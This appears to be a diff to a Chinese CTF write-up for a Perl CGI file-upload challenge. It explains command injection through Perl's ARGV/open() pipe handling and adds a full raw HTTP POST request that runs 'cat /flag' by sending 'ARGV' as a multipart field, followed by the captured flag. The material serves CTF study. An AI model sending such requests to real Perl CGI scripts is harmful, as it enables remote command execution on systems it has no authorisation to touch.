@@ -48,9 +48,39 @@ if ( $cgi->upload( 'file' ) ) {
 
 ![command](../../images/execute_command.png)
 
-%20是空格，-c指定要执行的命令，后面再传入的参数会被当作是要执行的命令的参数，但是分割要用\${IFS}。IFS一般代表空格，\${}读取变量的值，也就是打出空格。｜是管道运算符，用于将命令的执行结果劫持到当前网页，利用Perl open()函数打开的管道。如果不劫持是不会有输出的，因为/bin/bash的执行结果不算文件，会被放在缓冲区里。管道符可以将输出重定向到任意位置，这里定向到open打开的管道，也就是当前网页。读取flag的payload如下，
+%20是空格，-c指定要执行的命令，后面再传入的参数会被当作是要执行的命令的参数，但是分割要用\${IFS}。IFS一般代表空格，\${}读取变量的值，也就是打出空格。｜是管道运算符，用于将命令的执行结果劫持到当前网页，利用Perl open()函数打开的管道。如果不劫持是不会有输出的，因为/bin/bash的执行结果不算文件，会被放在缓冲区里。管道符可以将输出重定向到任意位置，这里定向到open打开的管道，也就是当前网页。读取flag的payload如下:
 
-- ?/flag
+```
+POST /cgi-bin/file.pl?cat+/flag HTTP/1.1
+Host: 3911f312-3396-421b-9136-a37835f4d9a2.node4.buuoj.cn:81
+Content-Length: 2020
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://3911f312-3396-421b-9136-a37835f4d9a2.node4.buuoj.cn:81
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymleITpyHyaAWDDND
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://3911f312-3396-421b-9136-a37835f4d9a2.node4.buuoj.cn:81/cgi-bin/file.pl
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: __gads=ID=f00405ef7dd07c2b-22e4cea8d3d90015:T=1673138658:RT=1673138658:S=ALNI_MaIBeJLfEQrPtxHvF5d_RvawAx58A; __gpi=UID=00000926669aa6ee:T=1673138658:RT=1673138658:S=ALNI_MaoW9zXWbCCtVgtccyGDCJIpcPeew
+Connection: close
 
-- ### Flag
+------WebKitFormBoundarymleITpyHyaAWDDND
+Content-Disposition: form-data; name="file";
+
+ARGV
+------WebKitFormBoundarymleITpyHyaAWDDND
+Content-Disposition: form-data; name="file"; filename="enc.py"
+Content-Type: text/x-python-script
+
+whatever
+------WebKitFormBoundarymleITpyHyaAWDDND
+Content-Disposition: form-data; name="Submit!"
+
+Submit!
+------WebKitFormBoundarymleITpyHyaAWDDND--
+```
+
+## Flag
   > cyberpeace{c610a0672df6b2e0a7d47ec186b5c0ac}
